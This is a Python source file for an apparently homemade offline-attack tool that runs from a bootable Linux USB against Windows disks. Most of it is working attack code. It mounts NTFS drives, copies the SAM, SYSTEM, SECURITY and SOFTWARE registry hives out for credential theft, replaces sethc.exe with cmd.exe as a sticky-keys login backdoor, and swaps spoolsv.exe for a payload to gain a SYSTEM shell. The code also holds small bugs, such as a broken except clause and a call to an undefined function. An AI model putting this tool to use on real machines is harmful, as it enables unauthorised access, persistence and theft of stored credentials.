#!/usr/bin/env python3 

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans 
# for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS 
#and exfils the calc.exe program for now.


import sys, subprocess, argparse, time, shutil, os, datetime


class Drive:
# Stored stat from a raw drive in a more accessible format.
# set_source sets the path that the drive is located at
# set_fs stores the file system for the drive
# get_source returns the path that the drive is located at
# is_mounted checks to see if the drive is mounted or not
    # If the drive is mounted 'yes' is returned
    # If the drive is not mounted 'no' is returned
    # THIS IS DUMB AS SHIT AND SHOULD BE A BOOLEAN

    def __init__(self):
        self.source = '' 
        self.fs = '' 
    def set_source(self, source):
        self.source = source
    def set_fs(self, fs):
        self.fs = fs
    def get_source(self):
        return self.source
    def get_fs(self):
        return self.fs
    def is_mounted(self):
        proc = subprocess.Popen('sudo mount', 
                stdout=subprocess.PIPE, shell=True)
        (mounted_drives, err) = proc.communicate()
        mounted_drives = mounted_drives.decode('utf-8')     
        if self.get_source() in mounted_drives:
            return 'yes'
        else:
            return 'no'


# Run the command sudo blkid and then recieve its output as a bytes
# Decode using utf-8 and then split on \n
# Returns a list of drive paths and their file systems
def grab_drives():
    proc = subprocess.Popen('sudo blkid', stdout=subprocess.PIPE, 
            shell=True)
    (drives, err) = proc.communicate()
    drives = drives.decode('utf-8').split('\n')
    return drives

# extracts the drives with ntfs types
# returns a list of windows drives
def locate_winfs(drives):
    win_drives = []
    for drive in drives:
        if 'ntfs' in drive:
            win_drives.append(drive)
    return win_drives
 
def mount_drive(drive):
    # accepts a path to a drive that you would like to mount
    # mounts the target drive to /mna/windows
    # if /windows does not exist, smugglebus will try to make it for you
    try:
        os.mkdir('/mnt/windows')
        print('/mnt/windows has been created for you, and will'
                ' be used as a mounting point')
    except PermissionError:
        print('was unable to create mountpoint. Please run '
                'hashsnatcher as root.')
        sys.exit()
    except FileExistsError:
        print('/mnt/windows exists, and will be used as a '
                'mounting point')
    subprocess.Popen('sudo ntfs-3g -o remove_hiberfile {} '
            '/mnt/windows'.format(drive.get_source()), shell=True)
    time.sleep(1)


# Not the best code but it works
# Need to figure out a way to write a single function that serves the purpose
# of all the locate*() functions. For now this works. The general reason these
# functions exist is because different versions of windows capitalize directory
# names differently. So in simple terms these functions use the lower-case
# version of a directory name , and compare it to what 
# os.listdir().casefold(). This lowercases both sides of the search.
# Then if a match is found, we take and store what is returned from os.listdir()
def locate_sticky_keyz():
    

    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'sethc.exe' == next_dir.casefold():
            target_directories['sethc']  = next_dir
            targets.append('{}/{}/{}'.format(target_directories["windows"], 
                target_directories["system32"],
                target_directories["sethc"]))

        
    return target_directories 

def locate_registry_paths():
    #target_directories = ['windows', 'system32', 'config']
    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'config' == next_dir.casefold():
            target_directories['config']  = next_dir
    print(target_directories)
    for hive in os.listdir('/mnt/windows/{}/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'],
            target_directories['config'])):
        
        if 'sam' == hive.casefold():
            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
                target_directories['windows'], 
                target_directories['system32'],
                target_directories['config'],
                hive))
        elif 'system' == hive.casefold():
            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
                target_directories['windows'], 
                target_directories['system32'],
                target_directories['config'],
                hive))
        elif 'security' == hive.casefold():
            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
                target_directories['windows'], 
                target_directories['system32'],
                target_directories['config'],
                hive))
        elif 'software' == hive.casefold():
            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
                target_directories['windows'], 
                target_directories['system32'],
                target_directories['config'],
                hive))
    return targets


def locate_cmd():
    # gotta make this shit find stickykeys exe on any windows machine
    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'cmd.exe' == next_dir.casefold():
            target_directories['cmd']  = next_dir
            targets.append('{}/{}/{}'.format(target_directories["windows"], 
                target_directories["system32"],
                target_directories["cmd"]))

        
    return target_directories 

def locate_sticky_keyzbak():
    # gotta make this shit find stickykeys exe on any windows machine
    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'sethc.exe.bak' == next_dir.casefold():
            target_directories['sethc']  = next_dir
            targets.append('{}/{}/{}'.format(target_directories["windows"], 
                target_directories["system32"],
                target_directories["sethc"]))
    return target_directories 


def get_sticky_shell():

    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    target_paths = locate_sticky_keyz()
    #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
    #        target_paths["system32"])))
    
    #stamp = str(datetime.datetime.now().timestamp())
    #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
    #os.mkdir(directory) 
    #print('/mnt/windows/{}/{}/{}'.format(
    #        target_paths["windows"], 
    #        target_paths["system32"],
    #        target_paths["sethc"]))
    
    
    try:
        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"]), 

            '/mnt/windows/{}/{}/{}.bak'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"]))

    except FileNotFoundError as e:
        print(e)
        print('/mnt/windows/{}/{}/{} was not found'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"]))

    target_paths = locate_cmd()

    print(target_paths)
    try:
        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["cmd"]), 

            '/mnt/windows/{}/{}/sethc.exe'.format(
            target_paths["windows"], 
            target_paths["system32"]))

    except FileNotFoundError as e:
        print(e)
        print('/mnt/windows/{}/{}/{} was not found'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["cmd"]))


    print('stickykeyz binary has been succesfully swapped with cmd.exe')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')



def revert_sticky_shell():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    target_paths = locate_sticky_keyzbak()
    #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
    #        target_paths["system32"])))
    
    #stamp = str(datetime.datetime.now().timestamp())
    #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
    #os.mkdir(directory) 
    #print('/mnt/windows/{}/{}/{}'.format(
    #        target_paths["windows"], 
    #        target_paths["system32"],
    #        target_paths["sethc"])) 
    
    try:
        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"]), 

            '/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"].replace('.bak', '')))

    except FileNotFoundError as e:
        print(e)
        print('/mnt/windows/{}/{}/{} was not found'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"]))

    os.remove('/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["sethc"])) 

    print('stickykeyz binary has been succesfully restored')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')

def locate_spoolsv():
    # gotta make this shit find stickykeys exe on any windows machine
    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'spoolsv.exe' == next_dir.casefold():
            target_directories['spoolsv']  = next_dir
            targets.append('{}/{}/{}'.format(target_directories["windows"], 
                target_directories["system32"],
                target_directories["spoolsv"]))
    return target_directories 


def locate_spoolsv_bak():
    target_directories = dict()
    base_dir = os.listdir('/mnt/windows')
    
    targets = []
    for next_dir in base_dir:
        if 'windows' == next_dir.casefold():
            target_directories['windows'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}'.format(
            target_directories['windows'])):
        if 'system32' == next_dir.casefold():
            target_directories['system32'] = next_dir
    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
            target_directories['windows'], 
            target_directories['system32'])):
        if 'spoolsv.exe.bak' == next_dir.casefold():
            target_directories['spoolsv']  = next_dir
            targets.append('{}/{}/{}'.format(target_directories["windows"], 
                target_directories["system32"],
                target_directories["spoolsv"]))
    return target_directories 


def implant_SYSTEM_shell():
    target_paths = locate_spoolsv()
    
    try:
        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["spoolsv"]), 

            '/mnt/windows/{}/{}/{}.bak'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["spoolsv"]))

    except FileNotFoundError as e:
        print(e)
        print('/mnt/windows/{}/{}/{} was not found'.format(
                target_paths["windows"], 
                target_paths["system32"],
                target_paths["spoolsv"]))
    try:

        shutil.copyfile('/home/tc/payloads/spoolsv.exe', 

            '/mnt/windows/{}/{}/spoolsv.exe'.format(
            target_paths["windows"], 
            target_paths["system32"]))
    except e:
        print(e)
def remove_SYSTEM_shell():
    target_paths = locate_spoolsv_bak()
    try:
        shutil.copyfile('/mnt/windows/{}/{}/{}.bak'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["spoolsv"]), 

            '/mnt/windows/{}/{}/{}'.format(
            target_paths["windows"], 
            target_paths["system32"],
            target_paths["spoolsv"].replace('.bak', '')))

    except e:
        print(e)
def implant_userland_shell():
    pass





def copy_registries():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    
    target_paths = locate_registry_paths()
    stamp = str(datetime.datetime.now().timestamp())
    directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
    os.mkdir(directory) 

    
    for path in target_paths:
        print(path)
        try:
            shutil.copyfile(path, 
                    '{}/{}'.format(directory, path.split('/').pop()))
        except FileNotFoundError as e:
            print('{} not found'.format(path))

    print('registry hives have been succesfully exfiltrated to your pwd')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')

def store_drives(raw_drives):
    # takes as input raw_drives from the blkid command
    # Returns a list of Drive objects

    obj_drives = []
    for i in range(len(raw_drives)):
        temp_drive = Drive()
        temp_raw_drive = raw_drives[i].split()
        for attribute in temp_raw_drive:
            if '/dev' in attribute:         
                attribute = list(attribute)
                attribute.pop()
                attribute = ''.join(attribute)
                temp_drive.set_source(attribute)     
            elif 'TYPE' in attribute:
                temp_drive.set_fs(attribute)
        obj_drives.append(temp_drive)
    return obj_drives

def check_for_windrives(raw_drives):
    #looking back this code is actually so trash. Gotta refactor.
    drive_count = 0
    raw_win_drives = locate_winfs(raw_drives)
    win_drives = store_drives(raw_win_drives)
    #not the happiest with this code but it works
    if len(raw_win_drives) < 1:
        print('no exploitable drives')
        return False
    else:
        print('\nConected drives using the NTFS file system.\n')
        for drive in raw_win_drives:
            print('[Drive {}] {}\n'.format(drive_count, drive))
            drive_count += 1
        target = input('\n========================================='
                '===============\nplease choose a drive to exploit.'
                ' Note drives start at 0\n\nDrive ')
        print('****************************************************'
                '*****************************************')
        print('Targeting: ' + raw_win_drives[int(target)])
        mount_drive(win_drives[int(target)])
        return True



def pretty_print(drives):
    # takes as input an instance of the Drive class and prints
    # out useful data about the given drive.

    # subprocess.call('cat assets/ascii_art', shell=True)
    print('\n\n     *******************************************************'
            '***************     ',
    end ='')
    print('\n     *******************A TABLE OF ALL CONNECTED'
            ' DEVICES*******************', 
            end ='')
    print('\n     *******************************************************'
            '***************     ',
            end ='')
    print('\n     *\t\t Drive Location\t      File System\t'
            'Mounted\t\t  *',end ='')
    for drive in drives:
        if len(drive.get_source()) > 10:
            print('\n     *\t\t   {}      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')

        if len(drive.get_fs()) > 6 and len(drive.get_source()) < 10:
            print('\n     *\t\t   {}\t      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')
        elif len(drive.get_fs()) == 4:
            print('\n     *  {}\t      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')
    print('\n     *******************************************************'
            '***************     ',
            end ='\n')



def main():

    parser = argparse.ArgumentParser(
            description=('Choose which mode to run program in. No '
            'input lists all the storage devices.'))
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-xh', '--extract_hives', action='store_true')
    group.add_argument('-i', '--implant', action='store_true')
    group.add_argument('-pd', '--print_drives', action='store_true')
    group.add_argument('-sk', '--sticky_keyz', action='store_true')
    group.add_argument('-rsk', '--remove_sticky_keyz', action='store_true')
    group.add_argument('-rss', '--remove_system_shell', action='store_true')
    group.add_argument('-ss', '--system_shell', action='store_true')

    args = parser.parse_args()

    # this grabs the raw text for the connected drives
    raw_drives = grab_drives()
    # this stores the raw drived as a Drive obj.
    conected_drives = store_drives(raw_drives)
    if args.extract_hives:
        if check_for_windrives(raw_drives):
            copy_registries()
    if args.print_drives:
        pretty_print(conected_drives)

    elif args.sticky_keyz:
        if check_for_windrives(raw_drives):
            get_sticky_shell()
    elif args.remove_sticky_keyz:
        if check_for_windrives(raw_drives):
            revert_sticky_shell()
    elif args.system_shell:
        if check_for_windrives(raw_drives):
            implant_SYSTEM_shell()
    elif args.remove_system_shell:
        if check_for_windrives(raw_drives):
            remove_system_shell()
#    elif args.implant:
#        if check_for_windrives(raw_drives):
#            implant_malware()

if __name__ == '__main__':
    main()
    

#pretty print script CHECK
# 
# What happens when yourun with no drives CHECK

# copy sam syste security and software NEEDS ATTENTION

# Modularize code to implement non hardcoded vals maybe add user input to select mount point and if none exists
# ask the user if they want to make a mountpoint

# unmount the drive at end of execution CHECK

# new arg that cp files onto the windows box

# find calc.exe rename it to calcbak.exe calc.bak? upload own version of calc

# bonus win10 registry of offline systems. 

# shit get cached in hybernation file?

# make table dynamically pull available file systems and display them. CHECK

